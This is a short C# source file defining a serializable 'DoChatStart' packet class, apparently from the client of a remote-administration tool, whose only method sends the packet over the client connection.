using System;
using xClient.Core.Networking;

namespace xClient.Core.Packets.ServerPackets
{
    [Serializable]
    public class DoChatStart : IPacket
    {
        public DoChatStart()
        {
        }

        public void Execute(Client client)
        {
            client.Send(this);
        }
    }
}
